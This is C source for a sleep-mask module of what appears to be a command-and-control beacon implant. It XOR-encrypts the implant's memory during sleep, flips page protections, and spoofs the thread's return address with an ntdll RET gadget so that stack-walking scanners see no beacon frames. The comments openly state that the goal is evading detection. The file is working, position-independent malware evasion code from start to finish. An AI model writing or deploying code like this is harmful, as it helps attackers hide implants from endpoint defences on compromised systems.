// stack_spoof — Sleep mask with return-address spoofing.
//
// Before entering the wait, this mask overwrites the thread's stack
// return addresses with gadgets pointing into ntdll, creating
// a fake but plausible call chain. When a scanner inspects the thread
// stack during sleep, it sees:
//
//   ntdll!NtWaitForSingleObject
//   ntdll!.text+0xNNN  (RET gadget)
//
// Instead of addresses pointing into beacon's .sleep/.slpmsk sections.
//
// The real return address is saved and restored after waking.
//
// Combines: XOR encryption + stack frame forgery + NtWaitForSingleObject.
//
// OPSEC advantages:
//   - Thread stack passes stack-walking heuristics (all frames in signed modules)
//   - Memory encrypted + marked RW
//   - No detectable beacon frames on stack

#include "../../sleep_mask_api.h"

// Forward declarations — helpers MUST be defined AFTER sleep_mask_entry
// so that sleep_mask_entry is at offset 0 of .text (PIC requirement).
static int   pic_strcmp(const char* a, const char* b);
static void* pic_get_proc(void* module_base, const char* func_name);
static void* find_ret_gadget(void* module_base);
static void  xor_regions(SleepMaskCtx* ctx);

typedef NTSTATUS (__stdcall *pfn_NtCreateEvent)(HANDLE*, DWORD, void*, int, BOOL);
typedef NTSTATUS (__stdcall *pfn_NtClose)(HANDLE);

// ---- ENTRY POINT (must be first defined function) -------------------------

void __cdecl sleep_mask_entry(SleepMaskCtx* ctx) {
    uint32_t i;
    SIZE_T sz;
    PVOID base;
    ULONG old_prot;

    // Строки на стеке — на x86 литералы генерируют абсолютные адреса,
    // которые невалидны в PIC-шелкоде.
    char s_nce[] = {'N','t','C','r','e','a','t','e','E','v','e','n','t',0};
    char s_nc[]  = {'N','t','C','l','o','s','e',0};

    // Resolve helpers.
    pfn_NtCreateEvent NtCreateEvent =
        (pfn_NtCreateEvent)pic_get_proc(ctx->ntdll_base, s_nce);
    pfn_NtClose NtClose =
        (pfn_NtClose)pic_get_proc(ctx->ntdll_base, s_nc);

    // Find RET gadgets in ntdll for stack spoofing.
    void* ntdll_ret = find_ret_gadget(ctx->ntdll_base);

    // Save the current return address from stack.
    // On x64, _AddressOfReturnAddress() gives us the return-address slot.
#ifdef _WIN64
    void** ret_slot = (void**)_AddressOfReturnAddress();
    void*  real_ret = *ret_slot;

    // Spoof: point return address into ntdll (a RET gadget).
    if (ntdll_ret)
        *ret_slot = ntdll_ret;
#endif

    // Create event for clean-stack wait.
    HANDLE hEvent = 0;
    int use_event = 0;
    if (NtCreateEvent && NtClose) {
        if (NtCreateEvent(&hEvent, 0x1F0003, 0, 1, FALSE) >= 0)
            use_event = 1;
    }

    // 1. Protect RW.
    for (i = 0; i < ctx->region_count; ++i) {
        base = ctx->regions[i].base;
        sz   = (SIZE_T)ctx->regions[i].size;
        ctx->NtProtectVirtualMemory(ctx->process_handle, &base, &sz, 0x04, &old_prot);
    }

    // 2. XOR encrypt.
    xor_regions(ctx);

    // 3. Wait (clean stack: our return points to ntdll RET gadget).
    {
        LARGE_INTEGER timeout;
        timeout.QuadPart = -(LONGLONG)ctx->sleep_ms * 10000LL;
        if (use_event)
            ctx->NtWaitForSingleObject(hEvent, FALSE, &timeout);
        else
            ctx->NtDelayExecution(FALSE, &timeout);
    }

    // 4. Decrypt.
    xor_regions(ctx);

    // 5. Restore protection.
    for (i = 0; i < ctx->region_count; ++i) {
        base = ctx->regions[i].base;
        sz   = (SIZE_T)ctx->regions[i].size;
        ctx->NtProtectVirtualMemory(ctx->process_handle, &base, &sz,
                                    (ULONG)ctx->regions[i].original_prot, &old_prot);
    }

    // 6. Flush.
    ctx->FlushInstructionCache(ctx->process_handle, 0, 0);

    // Restore real return address.
#ifdef _WIN64
    if (ntdll_ret)
        *ret_slot = real_ret;
#endif

    if (use_event) NtClose(hEvent);
}

// ---- Helpers (defined AFTER entry point) ----------------------------------

static void xor_regions(SleepMaskCtx* ctx) {
    for (uint32_t i = 0; i < ctx->region_count; ++i) {
        uint8_t* p = (uint8_t*)ctx->regions[i].base;
        uint32_t L = ctx->regions[i].size;
        for (uint32_t n = 0; n < L; ++n)
            p[n] ^= ctx->key[n & 15];
    }
}

static void* find_ret_gadget(void* module_base) {
    unsigned char* base = (unsigned char*)module_base;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    IMAGE_SECTION_HEADER* sec = (IMAGE_SECTION_HEADER*)((unsigned char*)&nt->OptionalHeader + nt->FileHeader.SizeOfOptionalHeader);
    WORD nsec = nt->FileHeader.NumberOfSections;

    for (WORD i = 0; i < nsec; ++i) {
        if (!(sec[i].Characteristics & 0x20000000)) continue; // IMAGE_SCN_MEM_EXECUTE
        unsigned char* p = base + sec[i].VirtualAddress;
        uint32_t sz = sec[i].Misc.VirtualSize;
        // Find a `ret` instruction (0xC3) at a reasonable offset.
        for (uint32_t j = 0x20; j < sz; ++j) {
            if (p[j] == 0xC3) return (void*)(p + j);
        }
    }
    return 0;
}

static int pic_strcmp(const char* a, const char* b) {
    while (*a && *a == *b) { a++; b++; }
    return (unsigned char)*a - (unsigned char)*b;
}

static void* pic_get_proc(void* module_base, const char* func_name) {
    unsigned char* base = (unsigned char*)module_base;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    IMAGE_DATA_DIRECTORY* exp_dir = &nt->OptionalHeader.DataDirectory[0];
    if (!exp_dir->VirtualAddress) return 0;
    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(base + exp_dir->VirtualAddress);
    DWORD* names    = (DWORD*)(base + exp->AddressOfNames);
    WORD*  ordinals = (WORD*)(base + exp->AddressOfNameOrdinals);
    DWORD* funcs    = (DWORD*)(base + exp->AddressOfFunctions);
    for (DWORD i = 0; i < exp->NumberOfNames; ++i) {
        if (pic_strcmp((const char*)(base + names[i]), func_name) == 0)
            return (void*)(base + funcs[ordinals[i]]);
    }
    return 0;
}
